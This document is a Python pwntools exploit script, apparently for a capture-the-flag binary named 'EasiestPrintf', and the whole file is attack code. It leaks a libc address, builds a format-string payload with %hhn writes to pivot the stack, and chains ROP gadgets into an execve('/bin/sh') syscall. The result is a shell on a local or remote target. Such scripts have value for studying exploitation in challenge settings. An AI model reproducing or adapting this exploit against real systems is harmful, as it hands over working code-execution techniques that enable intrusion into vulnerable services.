#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
	r.recvuntil(":")

	e = ELF('./EasiestPrintf')

	addr = 0x8049fdc
	r.sendline(str(addr))
	r.recvline()
	libc_puts = int(r.recvline().strip(), 16)

	libc_base = libc_puts - 0x64da0
	pivot = libc_base + 0xe9794
	__kernel_vsyscall = libc_base + 0x1af430
	libc_system = libc_base + 0x3e3e0
	bin_sh = libc_base + 0x15f551
	target = libc_base - 0x8f0 		# local 0x6b0
	r.recvline()

	xor_ecx_ecx = libc_base + 0x00028333  	# : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
	mov_edx_eax = libc_base + 0x0011b129 	# : mov edx, eax ; mov eax, edx ; ret
	eax_0xb = libc_base + 0x00144226		# : add eax, 0xb ; ret
	syscall = libc_base + 0x0002e3f5 		# : int 0x80

	log.info("libc_puts: " + hex(libc_puts))
	log.info("libc_base: " + hex(libc_base))
	log.info("pivot    : " + hex(pivot))
	log.info("target   : " + hex(target))
	log.info("vsyscall : " + hex(__kernel_vsyscall))

	one   = ((pivot >> 24) - 16)
	two   = (0x100 - one) + ((pivot&0x00ff0000) >> 16) - 0x10
	three = (0x100 - two) + ((pivot&0x0000ff00) >> 8) + 9
	if three < (pivot&0xff):
		print 'up'
		four = (( (pivot&0xff) - ((pivot&0x0000ff00) >> 8))& 0xff)
	else:
		print 'down'
		four  = (( (pivot&0xff) - ((pivot&0x0000ff00) >> 8))& 0xff)
	print "%d %d %d %d" % (one, two, three, four)

	payload  = p32(target+3)
	payload += p32(target+2)
	payload += p32(target+1)
	payload += p32(target)
	payload += '%%%dx' % one
	payload += '%7$hhn'
	payload += '%%%dx' % two
	payload += '%8$hhn'
	payload += '%%%dx' % three
	payload += '%9$hhn'
	payload += '%%%dx' % four
	payload += '%10$hhn'
#	payload = payload.ljust(158, 'A')
	payload += 'A'*44
	payload += p32(xor_ecx_ecx)
	payload += p32(bin_sh)
	payload += p32(0x41414141) * 3
	payload += p32(mov_edx_eax)
	payload += p32(eax_0xb)
	payload += p32(syscall)
	r.sendline(payload)

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./EasiestPrintf'], env={'LD_PRELOAD':'./libc.so.6_0ed9bad239c74870ed2db31c735132ce'})
        print util.proc.pidof(r)
        pause()
        exploit(r)